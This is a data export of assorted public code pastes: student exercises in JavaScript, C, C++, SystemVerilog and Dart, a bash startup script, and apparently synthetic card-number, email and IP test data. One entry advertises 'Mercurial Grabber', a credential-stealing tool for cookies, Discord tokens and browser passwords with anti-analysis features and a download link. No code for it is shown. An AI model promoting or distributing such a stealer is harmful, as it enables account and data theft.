id,title,username,language,date,content
AJy1675b,Untitled,foreverfugazi,SystemVerilog,Monday 16th of October 2023 11:24:47 AM CDT,"//code

module dlatch(
    input logic d,
    input logic en,
    input logic rst,
    output logic q
    );
    
    
    always@(en or rst or d)
    if(rst)
    q<=0;
    else
    if(en)
    q<=d;
endmodule


//testbench

module dlatch_tb();
logic d, en, rst;
logic q;

dlatch uut(d, en , rst, q);
initial begin
rst = 1; en =0; d =0;
#10
rst = 0; en = 0; d=1;
#10
rst=0; en = 1; d=1;
#10
$finish;
end
endmodule
"
PwLHzncC,initial_script,Sephinroth,Bash,Monday 16th of October 2023 11:24:19 AM CDT,"#!/bin/bash

sfsmanager fd64-devx_900.sfs
sfsmanager fd64-nls_900.sfs

cd /etc/init.d
chmod 755 60-civetweb
./60-civetweb start
cd /var/lib/www"
biSNC86i,"Mercurial Grabber (Grabs roblox cookies, discord tokens, ect.)",BestDimka,C#,Monday 16th of October 2023 11:17:08 AM CDT,"Mercurial Grabber

Download: https://github.com/BestDimka/MercurialGrabber

Features:
Grabs Roblox cookies from Roblox Studio
Grabs Minecraft sessions
Grabs Google Chrome passwords
Grabs Google Chrome cookies
Grabs Discord token
Grabs victim machine info
Grabs Windows product key
Grabs IP address, geolocation
Grabs screenshot
Anti Virtual Machine
Anti Debug

Customization:
Add a custom icon
Custom exe name

Educational Purposes Only:
This tool demonstrates and makes it easy to create your own grabber. This shows what type of information attackers can grab from a victim's computer. Only use this on your own PC and do not use it on other people maliciously."
wcEN71cf,Untitled,remico,JavaScript,Monday 16th of October 2023 11:06:57 AM CDT,"function workout (input){

let dayCount = Number (input[0]);  //5
let kmFirstDay = Number(input[1]); //30
let allKm = 0;
let index= 2; 
    for (let day = 1; day <=dayCount; day++){
        allKm += kmFirstDay;
         allKm  -= kmFirstDay * (Number(input[index]) / 100);
        index++;
    }
    if (allKm >= 1000) {
        let diference = allKm - 1000;
        console.log(`You've done a great job running ${diference} more   kilometers!`)
    } else {
        let difference = 1000 - allKm;
        console.log(`Sorry Mrs. Ivanova, you need to run ${difference} more kilometers!`)
    }
}
workout ([""5"",""30"",""10"",""15"",""20"",""5"",""12""]);"
2AMj9uSz,Untitled,remico,JavaScript,Monday 16th of October 2023 11:05:24 AM CDT,"function footballKit(input) {
    let tshirt = Number(input[0]);
    let goalSum = Number(input[1]);
    let pents = tshirt * 0.75;
    let socks = pents * 0.20;
    let snikers = (tshirt + pents) * 2;
    let allPrice = tshirt + pents + socks + snikers;
    let discount = allPrice * 0.85;
    
    if (discount >= goalSum) {
        console.log(""Yes, he will earn the world-cup replica ball!"");
        console.log(`His sum is ${discount} lv.`);
    } else {
        console.log(""No, he will not earn the world-cup replica ball."");
        let neededSum = goalSum - discount;
        console.log(`He needs ${neededSum.toFixed(2)} lv. more.`);
    }
   
}
footballKit (['55','310'])"
KEQMFjQa,Untitled,remico,JavaScript,Monday 16th of October 2023 11:01:49 AM CDT,"function excursion(input) {
    let numberPeoples = Number(input[0]);
    let numberNights = Number(input[1]);
    let numberCardsTransp = Number(input[2]);
    let numberTickets = Number(input[3]);
    let nightsPerPerson = 20;
    let cardsPerPerson = 1.60;
    let ticketPerPerson = 6;

    let nights = numberPeoples * numberNights;
    let cards = numberCardsTransp * cardsPerPerson;
    let tickets = numberTickets * ticketPerPerson;
    let totalSum = nights + cards + tickets;
    let totalSumAll = totalSum * numberPeoples;
    let all = totalSumAll + (totalSumAll * 0.25);
    console.log(all);

}
excursion(['20', '14', '30', '6']);
excursion(['131', '9', '33', '46']);

"
R87McVDf,Untitled,Anton_Boing,C,Monday 16th of October 2023 10:41:08 AM CDT,"##include <stdio.h>
 
int main() {
    int digit1, digit2, digit3;
    int count = 0;
 
    for (digit1 = 1; digit1 <= 9; digit1++) {
        for (digit2 = 0; digit2 <= 9; digit2++) {
            if (digit2 != digit1) {
                for (digit3 = 0; digit3 <= 9; digit3++) {
                    if (digit3 != digit1 && digit3 != digit2) {
                        int num = digit1 * 100 + digit2 * 10 + digit3;
                        printf(""%d "", num);
                        count++;
 
                        if (count % 8 == 0) {
                            printf(""\n"");
                        }
                    }
                }
            }
        }
    }
 
    return 0;
}
----для перевірки-----
Ось список всіх тризначних чисел в зростаючому порядку, у яких десятковий запис не має однакових цифр:

102, 103, 104, 105, 106, 107, 108, 109,
120, 123, 124, 125, 126, 127, 128, 129,
130, 132, 134, 135, 136, 137, 138, 139,
140, 142, 143, 145, 146, 147, 148, 149,
150, 152, 153, 154, 156, 157, 158, 159,
160, 162, 163, 164, 165, 167, 168, 169,
170, 172, 173, 174, 175, 176, 178, 179,
180, 182, 183, 184, 185, 186, 187, 189,
190, 192, 193, 194, 195, 196, 197, 198,
201, 203, 204, 205, 206, 207, 208, 209,
210, 213, 214, 215, 216, 217, 218, 219,
230, 231, 234, 235, 236, 237, 238, 239,
240, 241, 243, 245, 246, 247, 248, 249,
250, 251, 253, 254, 256, 257, 258, 259,
260, 261, 263, 264, 265, 267, 268, 269,
270, 271, 273, 274, 275, 276, 278, 279,
280, 281, 283, 284, 285, 286, 287, 289,
290, 291, 293, 294, 295, 296, 297, 298,
301, 302, 304, 305, 306, 307, 308, 309,
310, 312, 314, 315, 316, 317, 318, 319,
320, 321, 324, 325, 326, 327, 328, 329,
340, 341, 342, 345, 346, 347, 348, 349,
350, 351, 352, 354, 356, 357, 358, 359,
360, 361, 362, 364, 365, 367, 368, 369,
370, 371, 372, 374, 375, 376, 378, 379,
380, 381, 382, 384, 385, 386, 387, 389,
390, 391, 392, 394, 395, 396, 397, 398,
401, 402, 403, 405, 406, 407, 408, 409,
410, 412, 413, 415, 416, 417, 418, 419,
420, 421, 423, 425, 426, 427, 428, 429,
430, 431, 432, 435, 436, 437, 438, 439,
450, 451, 452, 453, 456, 457, 458, 459,
460, 461, 462, 463, 465, 467, 468, 469,
470, 471, 472, 473, 475, 476, 478, 479,
480, 481, 482, 483, 485, 486, 487, 489,
490, 491, 492, 493, 495, 496, 497, 498,
501, 502, 503, 504, 506, 507, 508, 509,
510, 512, 513, 514, 516, 517, 518, 519,
520, 521, 523, 524, 526, 527, 528, 529,
530, 531, 532, 534, 536, 537, 538, 539,
540, 541, 542, 543, 546, 547, 548, 549,
560, 561, 562, 563, 564, 567, 568, 569,
570, 571, 572, 573, 574, 576, 578, 579,
580, 581, 582, 583, 584, 586, 587, 589,
590, 591, 592, 593, 594, 596, 597, 598,
601, 602, 603, 604, 605, 607, 608, 609,
610, 612, 613, 614, 615, 617, 618, 619,
620, 621, 623, 624, 625, 627, 628, 629,
630, 631, 632, 634, 635, 637, 638, 639,
640, 641, 642, 643, 645, 647, 648, 649,
650, 651, 652, 653, 657, 658, 659, 670,
671, 672, 673, 674, 675, 678, 679, 680,
681, 682, 683, 684, 685, 687, 689, 690,
691, 692, 693, 694, 695, 697, 698, 701,
702, 703, 704, 705, 706, 708, 709, 710,
712, 713, 714, 715, 716, 718, 719, 720,
721, 723, 724, 725, 726, 728, 729, 730,
731, 732, 734, 735, 736, 738, 739, 740,
741, 742, 743, 745, 746, 748, 749, 750,
751, 752, 753, 754, 756, 758, 759, 760,
761, 762, 763, 764, 765, 768, 769, 780,
781, 782, 783, 784, 785, 786, 789, 790,
791, 792, 793, 794, 795, 796, 798, 801,
802, 803, 804, 805, 806, 807, 809, 810,
812, 813, 814, 815, 816, 817, 819, 820,
821, 823, 824, 825, 826, 827, 829, 830,
831, 832, 834, 835, 836, 837, 839, 840,
841, 842, 843, 845, 846, 847, 849, 850,
851, 852, 853, 856, 857, 859, 860, 861,
862, 863, 865, 867, 869, 870, 871, 872,
873, 874, 875, 876, 879, 890, 891, 892,
893, 894, 895, 896, 897, 901, 902, 903,
904, 905, 906, 907, 908, 910, 912, 913,
914, 915, 916, 917, 918, 920, 921, 923,
924, 925, 926, 927, 928, 930, 931, 932,
934, 935, 936, 937, 938, 940, 941, 942,
943, 945, 946, 947, 948, 950, 951, 952,
953, 954, 956, 957, 958, 960, 961, 962,
963, 964, 965, 967, 968, 970, 971, 972,
973, 974, 975, 976, 978, 980, 981, 982,
983, 984, 985, 986, 987."
gJaB6rca,Untitled,Zeinab_Hamdy,C++,Monday 16th of October 2023 10:37:59 AM CDT,"#include<bits/stdc++.h>
using namespace std;
#define nl ""\n""
#define fi first
#define se second
#define pb push_back
#define ll long long
#define ull unsigned ll
#define RV  return void
// #define inf 2000000000
#define sz(x) int(x.size())
#define all(v) v.begin(), v.end()
#define rall(v) v.rbegin(), v.rend()
#define Mini(x) *min_element(all(x))
#define Maxi(x) *max_element(all(x))
#define fixed(n) fixed << setprecision(n)
#define ceil(w, m) (((w) / (m)) + ((w) % (m) ? 1 : 0))
#define cin(v) for (auto&i:v) cin >> i;
#define cout(v) for (auto&i:v) cout << i << "" "";
#define clr(memo, x) memset(memo, x, sizeof memo)
#define updmin(a, b) a = min(a, b)
#define updmax(a, b) a = max(a, b)
#define vi vector < int >
#define vl vector < ll >
#define vc vector < char >
#define vs vector < string >
#define v2i vector < vector < int > >
#define v2l vector < vector < int > >
#define seti set < int >
#define setl set < ll >
#define mapii map < int , int >
#define mapll map < ll , ll >
#define mapli map < ll , int >
#define mapci map < char , int >
#define mapsi map < string , int >
#define pll pair < ll , ll >
#define pii pair < int , int >
#define range(l,r,x) for(int i=l ; i < r ; i+=x)
#define FastCode ios_base::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr);
vector < string > ternary= {""NO\n"" , ""YES\n""};

void  Zainab(){
            #ifndef ONLINE_JUDGE
              freopen(""input.txt"", ""r"", stdin);
              freopen(""output.txt"", ""w"", stdout);
            #endif
}


/*================================  solution  ================================ */

const int N = 1e3+5;
char arr[N][N];


int dx[] = {1 , -1 , 0 , 0};
int dy[] = {0 , 0 , 1 , -1};
char C[] = {'D' , 'U' , 'R' , 'L'};

bool vis[N][N];
int n , m;
string path , ans = ""-1"";



bool valid (int x , int y  ){
    return x >= 0 && x < n && y >= 0 && y < m && arr[x][y] != '#' && !vis[x][y];
}


void bfs(int ax  , int ay , int bx , int by){

    queue < pair < int , int > > q;
    q.push({ax , ay});
    vis[ax][ay] = 1;
    
    while(!q.empty()){
        auto p = q.front();
        q.pop();
        int x = p.fi , y = p.se;
        for(int i =0 ; i < 4 ; i++){
            int nx = x + dx[i] , ny = y + dy[i];
            
            if(valid(nx , ny)){
                vis[nx][ny] = 1;
                path += C[i];
                q.push({nx,ny});
                if(nx == bx && ny == by){
                    // cout << x << "" "" << y << "" "" << nx << "" "" << ny << nl;
                    // cout << path << nl;
                    
                    path.pop_back();
                    if(sz(path) < sz(ans) or ans ==""-1""){
                        ans = path ;
                        path="""";
                    }
                    
                }
               
            }
        }
    }
}



void myCode(){



    cin >> n >> m ;
    int aX  , aY , bX , bY;
    for(int i =0 ;  i < n ; i++){
        for(int j =0 ; j < m ; j++){
            cin >> arr[i][j];

            if(arr[i][j]=='A')
                aX = i ,  aY = j;
            else if(arr[i][j]=='B')
                bX = i , bY = j;
            
        }
    }


    bfs(aX , aY , bX , bY);
    cout << sz(ans) << nl;
    cout << ans ;
}


int main(){

                                FastCode ;
                     Zainab() ;

            int testCase=1;
                // cin >> testCase ;
            for(int i=1 ; i<= testCase ; i++){
                //  cout << ""Case #"" << i << "": "";
                myCode();
            }
      

    return 0;
}"
GG1m0AB8,TugasP4Mobile,timred22,Dart,Monday 16th of October 2023 10:29:48 AM CDT,"import 'package:flutter/material.dart';

class TugasP4 extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Color(0xffffffff),
      appBar: AppBar(
        title: Text(""Baris dan Kolom""),
      ),
      body: Row(
        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
        crossAxisAlignment: CrossAxisAlignment.center,
        children: [
          Column(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              Text(""Baris 1, Kolom 1""),
              Text(""Baris 2, Kolom 1""),
              Text(""Baris 3, Kolom 1""),
            ],
          ),
          Column(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              Text(""Baris 1, Kolom 2""),
              Text(""Baris 2, Kolom 2""),
              Text(""Baris 3, Kolom 2""),
            ],
          ),
          Column(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              Text(""Baris 1, Kolom 3""),
              Text(""Baris 2, Kolom 3""),
              Text(""Baris 3, Kolom 3""),
            ],
          ),
        ],
      ),
    );
  }
}
"
xgP7ATkX,Advanced AND - Donald AND Duck AND Hello,wheresTheAnyKey,C,Monday 16th of October 2023 10:28:39 AM CDT,"Pasted at: 16/10/2023 16:28
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND
hello, donald was a duck

5502491997132108

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
ww9cuLVd,Financial What's Inside - Email/IP/Bank,wheresTheAnyKey,C,Monday 16th of October 2023 10:28:38 AM CDT,"Pasted at: 16/10/2023 16:28
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3
What's Inside Paste 

5378496492418234
5571598708435236
5587663820997281
5502491997132108
5516931903918995
5322909948799236
5443317136071703
5409137465238695
5497550044220575
5559606180091553

aaribaud@att.net
aaribaud@comcast.net
aaribaud@att.com
aaribaud@att.co.uk
aaribaud@yahoo.com

246.107.72.199
221.187.199.189
3.109.3.44
109.112.85.139
250.83.213.179
169.141.201.234
50.180.50.59
20.181.54.231
64.235.191.167
48.103.36.43"
9GX2bznU,Financial with SPECIAL CHARACTERS,wheresTheAnyKey,C,Monday 16th of October 2023 10:28:36 AM CDT,"Pasted at: 16/10/2023 16:28
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

5148-2121-6312-7114   - DASHES
5148212163127114
5107-4578-0576-9075   - DASHES
5107457805769075
3488-1760-1454-729   - DASHES
348817601454729

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
